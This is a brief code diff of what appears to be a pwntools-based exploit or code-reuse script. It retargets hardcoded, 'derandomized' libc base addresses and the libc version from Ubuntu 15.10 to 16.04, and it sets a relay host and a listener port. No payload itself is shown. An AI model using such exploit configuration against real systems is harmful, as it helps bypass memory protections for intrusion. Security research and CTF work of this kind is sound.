@@ -36,15 +36,13 @@ def compile(script):
     return MyCodeGen(prog)
 
 if __name__ == '__main__':
-    libc_base = 0x00002aaaaacd1000 # 15.10
-    # libc_base = 0x00002aaaaacd3000 # 16.04
+    # libc_base = 0x00002aaaaacd1000 # 15.10
+    libc_base = 0x00002aaaaacd3000 # 16.04
     reloc = {'libc':libc_base, '_CODE':0x602010} # derandomized
 
-    LIBC_VERSION = '2.21'
-    # LIBC_VERSION = '2.23'
+    # LIBC_VERSION = '2.21'
+    LIBC_VERSION = '2.23'
     RELAY_HOST = '127.0.0.1'
-    RELAY_HOST = '192.168.1.7'
-    # RELAY_HOST = '192.168.98.1'
     RELAY_PORT = 12345
     listener = pwn.tubes.listen.listen(RELAY_PORT)
 
